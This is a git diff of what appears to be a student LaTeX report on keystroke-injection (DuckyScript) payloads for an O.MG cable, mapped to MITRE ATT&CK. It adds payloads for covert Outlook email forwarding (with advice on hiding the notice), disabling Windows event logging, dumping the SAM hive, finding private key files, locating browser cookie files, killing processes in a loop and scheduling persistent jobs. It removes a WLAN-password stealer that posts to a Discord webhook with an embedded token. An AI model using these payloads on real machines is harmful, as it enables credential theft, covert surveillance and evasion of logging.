@@ -110,7 +110,7 @@ The goal determines the type of attack, which will be further specified by the e
 
 \subsection{Intro}
 
-This section will give an overview over the methodologies of the developed payloads and defenses.
+This section will give an overview over the methodologies of the developed payloads and defenses. Their implementations will be discussed in the next section \ref{Implementation}
 
 
 \subsection{Payloads}
@@ -132,6 +132,12 @@ Payloads can either have some kind of impact on the system, be used to exfiltrat
 
 In the following, developed payloads will be presented.
 
+\subsubsection{Register Email Forwarding}
+
+For reconnaissance it is always interesting to spy on the emails a (potential) victim might receive, to see personal, maybe sensitive information, or possibly also to get access to two factor authentication codes in order to be able to log in somewhere. One simple way to achieve this, which is not yet present in the official O.MG payload repository, is by registering email forwarding. 
+
+
+
 \subsubsection{Disable Windows Event Logging}
 
 Windows event logging is a built in windows functionality that does logs the system's activity. There are multiple event types; Error, Warning, Information, Success Audit, Failure Audit logged in multiple different categories; System Log, Application Log, Security, Setup and Forwarded Events. 
@@ -139,15 +145,76 @@ Some actions on a system might raise errors, warnings or other types of events i
 There are multiple ways to disable windows event logging, in the implementation chapter, an UI option and a CLI option will be presented. 
 
 
-\subsubsection{Exfiltrate WLAn passwords via Discord}
+\subsubsection{Extract SSH hashes}
 
-[maybe make exfiltration it's own subchapter as one of the building blocks of the paylaods?]
+The Security Account Registry (SAM) on windows stores passwords as hashes. These hashes can be exfiltrated and used to spoof the victim. This is used as a technique in the Att\&ck lateral movement and Defense Evasion techniques \cite{UseAlternateAuthentication}. \\
+Access to these files is restricted to admin privileges on Windows, so this payload also has to contain and admin access step.
 
+\subsubsection{Extract Private Key Files}
+
+Public key cryptography builds on the notion of private and public keys that are calculated from a shared mathematical basis, such as the difficulty of factoring large prime numbers (in RSA) or solving the discrete logarithm problem (in EC). While it is extremely time and resource consuming to try and reverse these calculations, one more simple way to breach this security mechanism is to simply steal the keys. Often, such private keys are stored in private key files that have corresponding file extensions and are stored in common file locations. Therefore, it is possible to search default directories for private key files for the mentioned file extensions and extract them.    
+
+
+\subsubsection{Steal Web Session Cookies}
+
+While most of the information stored in web session cookies might not be sensitive, it can always be used for reconnaissance and learning about a target's habits and likes which can help plan other attacks. However, the information can also include authentication tokens that are used as session cookies after a login \cite{StealWebSession}. The files in which this data is stored can be extracted from a client machine. \\
+An attack that does this, first has to determine which browser should be targeted. For this, an attacker might search for the information of the default browser, send that information to a command server and then determine which extraction payload to trigger, based on that information. 
+
+
+\subsubsection{Iteratively End Processes} \label{Iteratively End Processes}
+
+One underexplored area of the Mitre Att\&ck framework is the persistance category. This Payloads aims to achieve persistance by iteratively ending running processes. There's two modes to the payload; white- and blacklist. It can easily be modified to only end a predefined set of application when it detects them as running, or it can end everything except for a predefined set of applications. This modification can be done depending on the goal of the attacker. 
+
+
+\subsubsection{Schedule Processes}
+
+One under explored area of the Mitre Att\&ck framework is persistence. This Payloads aims to achieve persistence by registering processes that will run iteratively depedning on a customizable trigger. This processes can be anything from recon scripts, to other persistence payloads, like for example the end processes payload \ref{Iteratively End Processes} which could run in the background if set up like this.
 
 
 \section{Implementation} \label{Implementation}
 
 \subsection{Payloads}
+
+\subsubsection{Register Email Forwarding}
+
+This payload is UI based, since it is using outlook. The difficulty for using the command line, or any tool really, is that it is designed to work without knowing the user's password. So using the most widely used email client, Outlook, is a natural approach. \\
+The payload opens Outlook through the Windows search menu, waits a considerable amount of time to let it start up and then navigates to the correct menu. This is a good example for how tricky it can be to use the UI approach; every menu option that is selected, prompts a small load delay that has to be factor into the payload. Simply running all the navigation and selection without or with small delays only, can very swiftly derail the attack because the computer simply is not yet ready for the next command. \\
+Once the payload has navigated to the correct menu, it can select the email for which the forwarding should be selected and where the emails should be forwarded to. After that, it closes the menu. One important thing to know for this payload is that this action will prompt a little dialogue window in the top right corner when the application is opened for the first time after the settings change, reminding the user of the new forwarding. Therefore, in order to mask their steps, the attacker should restart outlook to close the message such that the victim has less chance of discovering the attack. \\
+To illustrate this attack the following lines show some of the navigational steps:
+
+
+\begin{lstlisting}
+DELAY 100
+DOWNARROW
+DELAY 100
+DOWNARROW
+DELAY 100
+DOWNARROW
+DELAY 100
+ENTER
+DELAY 2000
+TAB
+DELAY 100
+DOWNARROW
+DELAY 100
+DOWNARROW
+DELAY 100
+DOWNARROW
+DELAY 100
+DOWNARROW
+DELAY 100
+DOWNARROW
+DELAY 100
+DOWNARROW
+DELAY 100
+DOWNARROW
+DELAY 100
+\end{lstlisting}
+
+Of course, the delay (in milliseconds) can be adjusted depending on the expected speed of the target machine. 
+
+
+
 
 \subsubsection{Disable Windows Event Logging}
 
@@ -159,6 +226,7 @@ This implementation opens the Windows Event log application through the Windows 
 This approach mimics the action of a UI focused user. As explained in section \ref{methodology} this has some drawbacks attached to it, namely the risk of unexpected UI behaviour and irregular loading times. This payload snippet exemplifies the approach of adding long delaysin between commands to ensure all actions are executed to completion before triggering the next command.\\
 The implementation of this payload contains a lot of tabs, due to the navigational nature. This is an excerpt for illustration:
 
+\begin{lstlisting}
 DELAY 1000
 TAB
 DELAY 2000
@@ -176,70 +244,138 @@ TAB
 DELAY 2000
 TAB
 DELAY 2000
-
+\end{lstlisting}
 
 \textbf{CLI}
 
 Using the Command Line for this attack does not have the same weaknesses as the UI approach. There is less chance for unexpected pop ups and since it is much shorter and requires fewer steps, loading times don't have as big an impact. On the other hand, executing admin level commands might pose a problem, as discussed in section \ref{methodology} \\
 
 Once the admin problem has been navigated, the payload is straightforward and consists of entering to commands and closing the Powershell window.
-The CLI appraoch is more reliable and concise, however, it requires admin priviledges for the shell. This can be achieved through the WinX menu, where the admin shell is opened directly. Then the payload consists only of a few more lines:
+The CLI appraoch is more reliable and concise, however, it requires admin privileges for the shell. This can be achieved through the WinX menu, where the admin shell is opened directly. Then the payload consists only of a few more lines:
 
+\begin{lstlisting}
 STRINGLN Stop-Service -Name "eventlog"
 DELAY 200
 STRINGLN Set-Service -Name "eventlog" -StartupType Disabled
 DELAY 300
 STRINGLN exit
+\end{lstlisting}
 
 
-\subsection{1. Stealing WLAN Passwords}
+\subsubsection{Extract SSH hashes}
 
-This is a basic implementation for a password stealing attack that exfiltrates the names and passwords of stored WLAN passwords on a windows 11 machine via Powershell. The exfiltration happens over a discord webhook \\
-First, powershell is started and the path changed to the temp file. Then netstat is used to extract the available WLAN information. For each of the with netstat created files, the name and password are extracted and converted to a json that can then be sent to the provided discord webhook. The file that was created is deleted right after the information needed from it has been extracted. After all is done, the powershell windwow is closed again.
+Hash's associated keys, subkeys, and values make up a hive that can be exfiltrated from the windows system by storing it in a file and the sending that file to a command server. \\
+Once admin privileges on a terminal have been secured, this is a straight forward process. 
 
-\begin{verbatim}
 
+ \begin{lstlisting} 
+ STRINGLN reg save HKLM\SAM C:\sam.hiv
+ \end{lstlisting}
+
+\subsubsection{Extract Private Key Files}
+
+File extensions can be searched with the help of Powershell. For that reason, this extraction payload will run a simple loop on a predefined (default) path to a directory that is expected to contain private key files and send the discovered files to a command server. 
+
+\begin{lstlisting}
 DUCKY_LANG DE_CH
-DELAY 3000
+DELAY 50
 GUI r
-DELAY 1000
-STRING powershell
+DELAY 200
+STRINGLN powershell.exe
+DELAY 2500
+STRINGLN $entryPoint = "your/path"
+DELAY 200
+STRINGLN $extensions = @(".key", ".pgp", ".gpg", ".ppk", ".p12", ".pem", ".pfx", ".cer", ".p7b", ".asc")
+DELAY 200
+STRINGLN Get-ChildItem -Path $entryPoint -Recurse | ForEach-Object {
+DELAY 200
+STRINGLN     if ($_.PSIsContainer) {
+DELAY 200
+STRINGLN         return
+DELAY 200
+STRINGLN     }
+DELAY 200
+DELAY 200
+STRINGLN     if ($extensions -contains $_.Extension) {
+DELAY 200
+STRINGLN         Write-Host "File found: $($_.FullName)"
+DELAY 200
+STRINGLN     }
+DELAY 200
+STRINGLN }
+DELAY 50
 ENTER
+DELAY 200
+STRINGLN exit
+\end{lstlisting}
+
+
+\subsubsection{Steal Web Session Cookies}
+
+A client's default browser can be extracted via Powershell using only one line:
+\begin{lstlisting}
+STRINGLN Get-ItemProperty -Path 'HKCU: Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' | Select-Object -ExpandProperty ProgId
+\end{lstlisting}
+
+After that information is sent back to the attacker, they can connect to the cable and remotely trigger the appropriate attack. For example, if the victim's default browser is firefox, they could start a terminal, navigate to the default directory for firefox cookies and extract that file.
+
+\begin{lstlisting}
+STRINGLN cd "C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\umva4gfp.default-release\cookies.sqlite"
+\end{lstlisting}
+
+The same approach can be used for chrome, the difference is in the file path.
+
+\begin{lstlisting}
+STRINGLN cd "C:\Users\maaik\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
+\end{lstlisting}
+
+\subsubsection{Iteratively End Processes}
+
+Finding and ending processes on Windows can be done with powershell and without admin privileges. The payload first defines the black- or whitelist, depending on the mode of the attack, then gets a list of all running processes. Next, it will either end all running processes that are also in the whitelist, or it will end every running process that is not in the blacklist. \\
+This is an excerpt of the whitelist mode;
+
+\begin{lstlisting}
+STRINGLN $criticalProcessesWhitelist = @( "firefox" , "ROCCAT_Swarm_Monitor", "Notepad" )
+DELAY 5
+STRINGLN while("true"){
+DELAY 5
+STRINGLN $runningProcesses = Get-Process | Select-Object -ExpandProperty Name | select -Unique
+DELAY 5
+STRINGLN foreach ($process in $runningProcesses) {
+DELAY 5
+STRINGLN if ($criticalProcessesWhitelist -contains $process) {
+DELAY 5
+STRINGLN Stop-Process -Name $process
+DELAY 5
+STRINGLN Write-Output "process $process deleted"
+DELAY 5
+STRINGLN }
+DELAY 5
+STRINGLN }
+DELAY 5
+STRINGLN Start-Sleep -Seconds 1.5
+DELAY 5
+STRINGLN }
+\end{lstlisting}
+
+The program features a while loop, which will keep it running continuously. It also includes a sleep to give the operating system time to actually terminate a process, before running Get-Process again thereby avoiding attention drawing error messages. In order for this payload to run, it is essential that the name in the white- or blacklist match exactly what the process name is that is returned by the Get-Process Powershell function. 
+
+
+
+\subsubsection{Schedule Processes}
+
+Windows Processes can be scheduled via powershell with admin privileges. As soon as that is achieved, a job trigger can be chosen. There is a wide variety to chose from, such as time intervals in seconds, minutes, days, even weeks, random delays, repetition for a set duration, or events such as logon or start up \cite{sdwheelerNewJobTriggerPSScheduledJobPowerShell}.
+For the purpose of this demonstration, logon is used. \\
+Similarly, some job options can also be configured, they can be things like '-ContinueIfGoingOnBattery' , -HideInTaskScheduler, -IdleTimeout (how long is the computer idle before the job starts), -RequireNetwork, and many more \cite{sdwheelerSetScheduledJobOptionPSScheduledJobPowerShell}. \\
+After these settings have been defined, the job itself is registered and the Powershell window can be closed. \\
+
+
+\begin{lstlisting}
 DELAY 2000
-STRING cd $Env:temp
-ENTER
-DELAY 500
-STRING netsh wlan export profile key=clear
-ENTER
-DELAY 1000
-STRING $Webhook = "https://discord.com/api/webhooks/1239948314686914591/KrGR_s1qlJbypG9F8jYVq8gDpAyBKFmEcyevqVlmTZOGcvs__5OXVx4QhRpyYLaaeJfG"
-ENTER
-DELAY 300
-STRING $files = Get-ChildItem WiFi-*.xml
-ENTER
-DELAY 300
-STRING foreach ($file in $files) {
-ENTER
-STRING $xmlContent = Get-Content -Path $file
-ENTER
-STRING Remove-Item $file
-ENTER
-STRING $xmlObject = [xml]$xmlContent
-ENTER
-STRING $Payload = @{name = $xmlObject.WLANProfile.SSIDConfig.SSID.name}
-ENTER
-STRING $Payload += @{password = $xmlObject.WLANProfile.MSM.security.sharedKey.keyMaterial}
-ENTER
-STRING $Json = @{content = $Payload | ConvertTo-Json } | ConvertTo-Json	
-ENTER
-STRING Invoke-RestMethod -Uri $Webhook -Method Post -Body $Json -ContentType 'application/json'
-ENTER
-STRING }
-ENTER
-DELAY 10000
-ALT SPACE
-DELAY 100
-STRING C
-    
-\end{verbatim}
-    
+STRINGLN $trigger = New-JobTrigger -AtLogon
+DELAY 200
+STRINGLN $options = New-ScheduledJobOption -StartIfOnBattery
+DELAY 200
+STRINGLN Register-ScheduledJob -Name ProcessJob -ScriptBlock {*enter script*} -Trigger $trigger -ScheduledJobOption $options
+DELAY 200
+\end{lstlisting}
